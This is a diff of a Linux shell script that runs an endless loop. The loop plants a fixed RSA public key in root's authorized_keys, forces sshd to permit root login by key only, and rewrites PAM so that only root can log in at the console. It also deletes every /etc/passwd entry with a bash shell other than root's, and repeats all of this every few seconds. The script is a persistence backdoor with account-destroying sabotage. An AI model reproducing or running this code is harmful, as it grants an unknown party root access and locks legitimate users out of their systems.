@@ -4,78 +4,79 @@ f_2=/etc/pam.d/login
 f_3=/etc/passwd
 
 while :; do
+  sed -i "/^#/d;/^\s*$/d" $f_1
 
-    [ -d "/root/.ssh/" ] || mkdir -p /root/.ssh/
-    [ -f "/root/.ssh/authorized_keys" ] || touch /root/.ssh/authorized_keys
-    a_1=$(sha256sum /root/.ssh/authorized_keys |awk '{print $1}')
-    if [ $a_1 != "cdaa79d692c63cb5fb643ed97cb2800a9a090802508e147dfbc9c44264744117" ];then
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA54MY4Dc0i//c90bNT9CxjJjM4f6C9RnFmRMxAWG2oA4hf3/oftkkLBpIDtIsmDIRg+YNg0rycgid1P/VecL+TbDwsjSCQhgX++a1ByZaPQ4c44njkKo6breWc7qbqZm8VGiBzXmWEjNDY0A9wcffRkSSTcRRmffdsefeWjoApDzjrXJ8WmcnGYmMdG2QwMuJa1iCPMdUFrz9ZWsAP+tRfSsmluKWeJ3m9+M2xLpd+B0FhACMBvhqXgtUmPU9W0xFKma6TzyV64edT2CeCRkgSQQFgtTFA5ADhmo2aZtpQuT5GX6TLbhqVkmwJp2Uvw5XKaZHwtlGmb3gTqUNWmy7kQ== OpenSSH-rsa-import-052522">/root/.ssh/authorized_keys
-    fi
-     
-    grep "^PasswordAuthentication no$" $f_1  &>/dev/null
-    if [ $? -ne 0 ];then
-        chmod 0600 $f_1
-        sed -i "/PasswordAuthentication/d" $f_1
-        echo "PasswordAuthentication no">> $f_1
-        systemctl restart sshd
-    fi
-    
-    grep "^PermitRootLogin yes$" $f_1 &>/dev/null
-    if [ $? -ne 0 ];then
-        chmod 0600 $f_1
-        sed -i "/PermitRootLogin/d" $f_1
-        echo "PermitRootLogin yes">> $f_1
-        systemctl restart sshd
-    fi
-    
-    grep "^RSAAuthentication yes$" $f_1 &>/dev/null
-    if [ $? -ne 0 ];then
-        chmod 0600 $f_1
-        sed -i "/RSAAuthentication/d" $f_1
-        echo "RSAAuthentication yes">> $f_1
-        systemctl restart sshd
-    fi
-    
-    grep "^PubkeyAuthentication yes$" $f_1 &>/dev/null
-    if [ $? -ne 0 ];then
-        chmod 0600 $f_1
-        sed -i "/PubkeyAuthentication/d" $f_1
-        echo "PubkeyAuthentication yes">> $f_1
-        systemctl restart sshd
-    fi
-    
-    grep "^AuthorizedKeysFile \.ssh\/authorized_keys$" $f_1 &>/dev/null
-    if [ $? -ne 0 ];then
-        chmod 0600 $f_1
-        sed -i "/AuthorizedKeysFile/d" $f_1
-        echo "AuthorizedKeysFile .ssh/authorized_keys">> $f_1
-        systemctl restart sshd
-    fi
-    
-    grep "^auth required pam_succeed_if\.so user != root quiet$" $f_2 &>/dev/null
-    if [ $? -ne 0 ];then
-        chmod 0644 $f_2
-        sed -i "/auth.*required.*root.*quiet/d" $f_2
-        sed -i "1i\auth required pam_succeed_if\.so user != root quiet" $f_2
-        sed -i "2i\auth required pam_succeed_if\.so user = root quiet" $f_2
-    fi
-    grep "^auth required pam_succeed_if\.so user = root quiet$" $f_2 &>/dev/null
-    if [ $? -ne 0 ];then
-        chmod 0644 $f_2
-        sed -i "/auth.*required.*root.*quiet/d" $f_2
-        sed -i "1i\auth required pam_succeed_if\.so user != root quiet" $f_2
-        sed -i "2i\auth required pam_succeed_if\.so user = root quiet" $f_2
-    fi
-    
-    grep ":/bin/bash\s*$" $f_3 |grep -v "^\s*root:" &>/dev/null
-    if [ $? -eq 0 ];then
-        chmod 0644 $f_3
-        sed -i "/:\/bin\/bash\s*$/d" $f_3
-    fi
-    grep "^root:x:0:0:root:/root:/bin/bash$" $f_3 &>/dev/null
-    if [ $? -ne 0 ];then
-        sed -i "1i\root:x:0:0:root:\/root:\/bin\/bash" $f_3
-    fi
+  [ -d "/root/.ssh/" ] || mkdir -p /root/.ssh/
+  [ -f "/root/.ssh/authorized_keys" ] || touch /root/.ssh/authorized_keys
+  a_1=$(sha256sum /root/.ssh/authorized_keys | awk '{print $1}')
+  if [ $a_1 != "f33542f9ce3512e38d151051924f042f0730c54c755635a1ea1402779cfc3473" ]; then
+    echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA54MY4Dc0i//c90bNT9CxjJjM4f6C9RnFmRMxAWG2oA4hf3/oftkkLBpIDtIsmDIRg+YNg0rycgid1P/VecL+TbDwsjSCQhgX++a1ByZaPQ4c44njkKo6breWc7qbqZm8VGiBzXmWEjNDY0A9wcffRkSSTcRRmffdsefeWjoApDzjrXJ8WmcnGYmMdG2QwMuJa1iCPMdUFrz9ZWsAP+tRfSsmluKWeJ3m9+M2xLpd+B0FhACMBvhqXgtUmPU9W0xFKma6TzyV64edT2CeCRkgSQQFgtTFA5ADhmo2aZtpQuT5GX6TLbhqVkmwJp2Uvw5XKaZHwtlGmb3gTqUNWmy7kQ== OpenSSH-rsa-import-052522" >/root/.ssh/authorized_keys
+  fi
 
-    sleep 5
+  grep "^PasswordAuthentication no$" $f_1 &>/dev/null
+  if [ $? -ne 0 ]; then
+    chmod 0600 $f_1
+    sed -i "/PasswordAuthentication/d" $f_1
+    echo "PasswordAuthentication no" >>$f_1
+    systemctl restart sshd &>/dev/null
+  fi
+
+  grep "^PermitRootLogin yes$" $f_1 &>/dev/null
+  if [ $? -ne 0 ]; then
+    chmod 0600 $f_1
+    sed -i "/PermitRootLogin/d" $f_1
+    echo "PermitRootLogin yes" >>$f_1
+    systemctl restart sshd &>/dev/null
+  fi
+
+  grep "^RSAAuthentication yes$" $f_1 &>/dev/null
+  if [ $? -ne 0 ]; then
+    chmod 0600 $f_1
+    sed -i "/RSAAuthentication/d" $f_1
+    echo "RSAAuthentication yes" >>$f_1
+    systemctl restart sshd &>/dev/null
+  fi
+
+  grep "^PubkeyAuthentication yes$" $f_1 &>/dev/null
+  if [ $? -ne 0 ]; then
+    chmod 0600 $f_1
+    sed -i "/PubkeyAuthentication/d" $f_1
+    echo "PubkeyAuthentication yes" >>$f_1
+    systemctl restart sshd &>/dev/null
+  fi
+
+  grep "^AuthorizedKeysFile \.ssh\/authorized_keys$" $f_1 &>/dev/null
+  if [ $? -ne 0 ]; then
+    chmod 0600 $f_1
+    sed -i "/AuthorizedKeysFile/d" $f_1
+    echo "AuthorizedKeysFile .ssh/authorized_keys" >>$f_1
+    systemctl restart sshd &>/dev/null
+  fi
+
+  grep "^auth required pam_succeed_if\.so user != root quiet$" $f_2 &>/dev/null
+  if [ $? -ne 0 ]; then
+    chmod 0644 $f_2
+    sed -i "/auth.*required.*root.*quiet/d" $f_2
+    sed -i "1i\auth required pam_succeed_if\.so user != root quiet" $f_2
+    sed -i "2i\auth required pam_succeed_if\.so user = root quiet" $f_2
+  fi
+  grep "^auth required pam_succeed_if\.so user = root quiet$" $f_2 &>/dev/null
+  if [ $? -ne 0 ]; then
+    chmod 0644 $f_2
+    sed -i "/auth.*required.*root.*quiet/d" $f_2
+    sed -i "1i\auth required pam_succeed_if\.so user != root quiet" $f_2
+    sed -i "2i\auth required pam_succeed_if\.so user = root quiet" $f_2
+  fi
+
+  grep ":/bin/bash\s*$" $f_3 | grep -v "^\s*root:" &>/dev/null
+  if [ $? -eq 0 ]; then
+    chmod 0644 $f_3
+    sed -i "/:\/bin\/bash\s*$/d" $f_3
+  fi
+  grep "^root:x:0:0:root:/root:/bin/bash$" $f_3 &>/dev/null
+  if [ $? -ne 0 ]; then
+    sed -i "1i\root:x:0:0:root:\/root:\/bin\/bash" $f_3
+  fi
+
+  sleep 4
 done
